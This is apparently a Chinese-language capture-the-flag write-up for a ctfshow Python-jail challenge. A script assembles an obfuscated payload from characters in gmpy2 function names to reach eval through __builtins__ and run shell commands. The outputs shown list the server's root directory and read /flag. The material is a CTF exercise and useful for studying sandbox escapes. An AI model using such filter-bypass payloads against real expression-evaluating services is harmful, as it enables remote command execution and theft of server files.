使用以下 Python 代码生成 Payload
```
import gmpy2

target = "__import__('os').popen('ls /').read()"

payload = "gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]("

for ch in target:
    if ch not in "/'(). ":
        best_name = None
        best_idx = 0
        for name in dir(gmpy2):
            pos = name.find(ch)
            if pos >= 0 and (best_name is None or len(name) < len(best_name)):
                best_name = name
                best_idx = pos
        payload += f"'{best_name}'[{best_idx}]+"
    else:
        # 对于 / ' ( ) . 空格 这几个符号，直接用字面量
        payload += f'"{ch}"+'

payload = payload.rstrip('+') + ")"
print(payload)
```
输出
```
gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'lcm'[0]+'cos'[2]+" "+"/"+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
```
计算结果
```
计算成功，答案是app bin dev etc flag home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var
```

```
import gmpy2

target = "__import__('os').popen('cat /flag').read()"

payload = "gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]("

for ch in target:
    if ch not in "/'(). ":
        best_name = None
        best_idx = 0
        for name in dir(gmpy2):
            pos = name.find(ch)
            if pos >= 0 and (best_name is None or len(name) < len(best_name)):
                best_name = name
                best_idx = pos
        payload += f"'{best_name}'[{best_idx}]+"
    else:
        # 对于 / ' ( ) . 空格 这几个符号，直接用字面量
        payload += f'"{ch}"+'

payload = payload.rstrip('+') + ")"
print(payload)
```
输出
```
gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cmp'[0]+'ai'[0]+'cot'[2]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
```
计算结果
```
计算成功，答案是ctfshow{e0cdff4b-2a0a-45c8-8d80-9fad64c8e8cb}
```